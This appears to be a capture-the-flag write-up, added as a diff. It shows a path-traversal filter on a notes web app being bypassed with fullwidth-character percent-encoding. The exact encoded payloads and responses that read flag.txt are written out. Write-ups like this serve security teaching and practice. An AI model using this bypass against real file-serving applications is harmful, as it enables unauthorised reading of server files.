@@ -1,0 +1,43 @@
+Target: http://chal.thjcc.org:12024/
+
+1. Enumerate notes
+
+GET /api/notes
+
+HTTP/1.1 200
+["cybersec.txt","learn.txt","ramen.txt"]
+
+2. Direct traversal is blocked
+
+GET /api/read?f=..%2F..%2Fflag.txt
+
+HTTP/1.1 403
+u are blocked XD
+
+3. Confirm fullwidth hexadecimal decoding
+
+Human-readable parameter:
+  ramen%２Ｅtxt
+
+Wire-encoded query:
+  f=ramen%25%EF%BC%92%EF%BC%A5txt
+
+Result:
+  HTTP/1.1 200
+  [contents of ramen.txt]
+
+The application decoded %２Ｅ to an ASCII period.
+
+4. Escape the notes directory
+
+Human-readable parameter:
+  %２Ｅ%２Ｅ%２Ｆ%２Ｅ%２Ｅ%２Ｆflag.txt
+
+Wire-encoded query:
+  f=%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A6%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A6flag.txt
+
+Decoded filesystem path:
+  ../../flag.txt
+
+HTTP/1.1 200
+THJCC{inspired_by_blackhat_asia_2026}
